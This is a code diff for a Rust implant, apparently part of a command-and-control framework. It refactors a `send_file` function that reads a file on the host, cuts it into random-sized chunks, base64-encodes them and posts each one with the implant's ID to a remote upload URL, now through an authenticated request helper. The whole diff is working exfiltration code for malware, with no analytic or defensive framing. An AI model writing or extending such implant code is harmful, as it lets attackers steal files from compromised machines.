@@ -1,8 +1,9 @@
 use base64::{engine::general_purpose::STANDARD, Engine as _};
 use rand::Rng;
-use reqwest::Client;
 use std::{fs::File, io::Read, path::Path, time::Duration};
 use uuid::Uuid;
+
+use crate::utils::request::send_authenticated_request;
 
 const MIN_CHUNK_SIZE: usize = 256 * 1024; // 256 KB
 const MAX_CHUNK_SIZE: usize = 1024 * 1024; // 1 MB
@@ -10,9 +11,8 @@ const MAX_CHUNK_SIZE: usize = 1024 * 1024; // 1 MB
 pub async fn send_file(
     implant_id: Uuid,
     file_path: &Path,
-    c2_url: &str,
+    upload_url: &str,
 ) -> Result<(), Box<dyn std::error::Error>> {
-    let client = Client::new();
     let mut file = File::open(file_path)?;
     let mut chunk_index = 0;
 
@@ -32,28 +32,33 @@ pub async fn send_file(
                 // Encode with base64 for the transfer
                 let encoded_chunk = STANDARD.encode(chunk_data);
 
-                let response = client
-                    .post(c2_url)
-                    .json(&serde_json::json!({
-                        "uuid": implant_id,
-                        "file_id": &file_id,
-                        "chunk_index": chunk_index,
-                        "chunk_data": &encoded_chunk,
-                    }))
-                    .send()
-                    .await
-                    .unwrap();
+                let content_json = &serde_json::json!({
+                    "uuid": implant_id,
+                    "file_id": &file_id,
+                    "chunk_index": chunk_index,
+                    "chunk_data": &encoded_chunk,
+                });
 
-                if !response.status().is_success() {
-                    eprintln!(
-                        "Failed to send chunk {}, status: {}",
-                        chunk_index,
-                        response.status()
-                    );
-                    break;
+                let response = send_authenticated_request("post", upload_url, content_json).await;
+
+                match response {
+                    Ok(res) => {
+                        if res.status().is_success() {
+                            chunk_index += 1;
+                        } else {
+                            eprintln!(
+                                "Failed to send chunk {}, status: {}",
+                                chunk_index,
+                                res.status()
+                            );
+                            break;
+                        }
+                    }
+                    Err(e) => {
+                        eprintln!("Error response from server: {}", e);
+                        break;
+                    }
                 }
-
-                chunk_index += 1;
             }
             Ok(_) => {
                 println!("Successfully sent all chunks! File id: {}", file_id);
